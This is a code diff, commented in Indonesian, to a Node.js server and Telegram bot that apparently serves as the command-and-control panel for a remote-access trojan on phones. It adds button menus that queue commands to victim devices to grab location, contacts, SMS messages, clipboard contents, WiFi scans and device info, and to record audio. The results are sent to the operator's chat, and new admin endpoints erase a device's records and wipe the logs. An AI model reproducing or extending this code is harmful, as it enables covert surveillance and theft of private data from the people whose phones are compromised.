@@ -1,6 +1,6 @@
 require('dotenv').config();
 const express = require('express');
-const { Telegraf } = require('telegraf');
+const { Telegraf, Markup } = require('telegraf');
 const { Pool } = require('pg');
 const path = require('path');
 const { v4: uuidv4 } = require('uuid');
@@ -102,32 +102,110 @@ const updateDeviceSeen = async (deviceId) => {
     await db.run('INSERT OR REPLACE INTO devices (id, last_seen) VALUES (?, ?)', [deviceId, timestamp]);
 };
 
+// Helper: Format Output JSON ke teks yang mudah dibaca (List Mode)
+const formatDeviceResponse = (data) => {
+    if (typeof data === 'string') return `\n└ ${data}`;
+    if (Array.isArray(data)) {
+        if (data.length === 0) return '\n└ [Data Kosong]';
+        return '\n' + data.map((item, idx) => `  ${idx + 1}. ` + (typeof item === 'object' ? Object.entries(item).map(([k, v]) => `${k}: ${v}`).join(' | ') : item)).join('\n');
+    }
+    if (typeof data === 'object' && data !== null) {
+        return '\n' + Object.entries(data).map(([k, v]) => `  • <b>${k}</b>: ${v}`).join('\n');
+    }
+    return `\n└ ${data}`;
+};
+
 // --- TELEGRAM BOT ---
 let bot;
 if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
     bot = new Telegraf(TELEGRAM_TOKEN);
 
-    bot.start((ctx) => ctx.reply('Bot Active (Node.js Migrated).\n/list - Devices\n/cmd [id] [cmd]'));
+    // Mendaftarkan perintah ke dalam kotak input Telegram
+    bot.telegram.setMyCommands([
+        { command: 'start', description: 'Lihat menu utama bot' },
+        { command: 'list', description: 'Tampilkan perangkat aktif dengan tombol pilih' },
+        { command: 'cmd', description: 'Mode manual (Contoh: /cmd dev1 ping)' }
+    ]);
 
-    bot.command('list', async (ctx) => {
+    bot.start((ctx) => {
+        const msg = `⚡ <b>RAC-JS Node Command Center</b> ⚡\n\nSelamat datang di Control Panel. Silakan pilih menu di bawah ini:`;
+        ctx.reply(msg, {
+            parse_mode: 'HTML',
+            ...Markup.inlineKeyboard([
+                [Markup.button.callback('🔍 Lihat Perangkat Aktif', 'btn_list')]
+            ])
+        });
+    });
+
+    bot.command('list', async (ctx) => listDevicesToChat(ctx));
+    bot.action('btn_list', async (ctx) => {
+        ctx.answerCbQuery();
+        listDevicesToChat(ctx);
+    });
+
+    const listDevicesToChat = async (ctx) => {
         const devices = await db.all('SELECT * FROM devices');
-        if (devices.length === 0) return ctx.reply('No devices seen yet.');
+        if (devices.length === 0) return ctx.reply('📭 Belum ada perangkat yang terhubung ke server.');
 
-        let msg = "Devices:\n";
+        const buttons = [];
         devices.forEach(d => {
             const isOnline = (Date.now() / 1000 - d.last_seen) < 60;
-            msg += `- \`${d.id}\` ${isOnline ? '🟢' : '🔴'}\n`;
+            const statusIcon = isOnline ? '🟢' : '🔴';
+            buttons.push([Markup.button.callback(`${statusIcon} ${d.id}`, `select_dev_${d.id}`)]);
         });
-        ctx.replyWithMarkdown(msg);
+
+        ctx.reply('📱 <b>Pilih Target Perangkat:</b>', {
+            parse_mode: 'HTML',
+            ...Markup.inlineKeyboard(buttons)
+        });
+    };
+
+    // Menangani klik dari tombol Device yang dipilih
+    bot.action(/^select_dev_(.+)$/, async (ctx) => {
+        const devId = ctx.match[1];
+        ctx.answerCbQuery();
+
+        const menuBtns = [
+            [Markup.button.callback('📡 Ping', `runcmd_${devId}_ping`), Markup.button.callback('🎯 Lokasi', `runcmd_${devId}_location`)],
+            [Markup.button.callback('🔋 Baterai', `runcmd_${devId}_get_battery`), Markup.button.callback('🔦 Torch', `runcmd_${devId}_torch`)],
+            [Markup.button.callback('📞 Kontak', `runcmd_${devId}_contacts`), Markup.button.callback('📩 Inbox SMS', `runcmd_${devId}_sms_list`)],
+            [Markup.button.callback('🔊 Record Audio', `runcmd_${devId}_record_sound`), Markup.button.callback('📻 Info Volume', `runcmd_${devId}_get_volume`)],
+            [Markup.button.callback('🌐 WiFi Scan', `runcmd_${devId}_wifi_scan`), Markup.button.callback('📋 Clipboard', `runcmd_${devId}_clipboard`)],
+            [Markup.button.callback('ℹ️ Info Sistem', `runcmd_${devId}_get_device_info`), Markup.button.callback('⚙️ Sensor', `runcmd_${devId}_sensors`)]
+        ];
+
+        ctx.reply(`🎯 <b>Perangkat Terpilih:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`, {
+            parse_mode: 'HTML',
+            ...Markup.inlineKeyboard(menuBtns)
+        });
+    });
+
+    // Menangani klik perintah spesifik dari device
+    bot.action(/^runcmd_(.+)_(.+)$/, async (ctx) => {
+        const devId = ctx.match[1];
+        const cmdName = ctx.match[2];
+        ctx.answerCbQuery(`Menjalankan ${cmdName}...`);
+
+        const cmdId = uuidv4().slice(0, 8);
+        const chatId = ctx.callbackQuery.message.chat.id.toString();
+
+        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
+            [cmdId, devId, cmdName, '', 'pending', chatId]);
+
+        ctx.reply(`⏳ <b>[${cmdName}]</b> masuk ke antrean untuk <code>${devId}</code>...`, { parse_mode: 'HTML' });
     });
 
     bot.command('cmd', async (ctx) => {
         const args = ctx.message.text.split(' ');
-        if (args.length < 3) return ctx.reply('Usage: /cmd [id] [command] [text]');
+        if (args.length < 3) return ctx.reply('Gunakan mode manual 🛠️:\n/cmd [id_device] [nama_perintah] [teks_opsional]');
 
         const devId = args[1];
         const cmdName = args[2];
         const extraText = args.slice(3).join(' ');
+
+        // Validasi Device ID
+        const check = await db.get('SELECT id FROM devices WHERE id = ?', [devId]);
+        if (!check) return ctx.reply(`❌ Perangkat <code>${devId}</code> tidak ditemukan di dalam database.`, { parse_mode: 'HTML' });
 
         const cmdId = uuidv4().slice(0, 8);
         const chatId = ctx.chat.id.toString();
@@ -135,7 +213,7 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
         await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
             [cmdId, devId, cmdName, extraText, 'pending', chatId]);
 
-        ctx.reply(`Queued: ${cmdName} -> ${devId}`);
+        ctx.reply(`🗃️ <b>Manual Queued:</b> ${cmdName} ➡️ <code>${devId}</code>`, { parse_mode: 'HTML' });
     });
 
     if (WEBHOOK_URL) {
@@ -206,7 +284,8 @@ app.post('/response', async (req, res) => {
                         filename: `response_${data.id}.json`
                     }, { caption: `✅ <b>Respon dari alat (${client_id}):</b> Payload terlalu besar, dikirim sebagai file.`, parse_mode: 'HTML' });
                 } else {
-                    const replyMessage = `✅ <b>Respon dari alat (${client_id}):</b>\n<pre><code class="language-json">${jsonString}</code></pre>`;
+                    const formattedDisplay = formatDeviceResponse(deviceResponse);
+                    const replyMessage = `✅ <b>Respon Eksekusi [${client_id}]:</b>\n${formattedDisplay}`;
                     await bot.telegram.sendMessage(cmd.chat_id, replyMessage, { parse_mode: 'HTML' });
                 }
             }
@@ -265,6 +344,28 @@ app.post('/admin/api/command', async (req, res) => {
     await db.run('INSERT INTO commands (id, device_id, command, text, status) VALUES (?, ?, ?, ?, ?)',
         [cmdId, device_id, command, text || '', 'pending']);
     res.json({ status: 'success', command_id: cmdId });
+});
+
+app.delete('/admin/api/device/:id', async (req, res) => {
+    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const devId = req.params.id;
+    await db.run('DELETE FROM commands WHERE device_id = ?', [devId]);
+    await db.run('DELETE FROM system_logs WHERE device_id = ?', [devId]);
+    await db.run('DELETE FROM devices WHERE id = ?', [devId]);
+    res.json({ status: 'success', message: 'Perangkat berhasil dibersihkan dari registry.' });
+});
+
+app.delete('/admin/api/logs', async (req, res) => {
+    if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+    const filterDays = parseInt(req.query.days) || 0;
+
+    if (filterDays === 0) {
+        await db.run('DELETE FROM system_logs');
+    } else {
+        // Syntax PostgreSQL untuk pengurangan waktu
+        await db.run(`DELETE FROM system_logs WHERE created_at < NOW() - INTERVAL '${filterDays} days'`);
+    }
+    res.json({ status: 'success', message: 'Log sistem berhasil dibersihkan.' });
 });
 
 app.listen(PORT, () => {
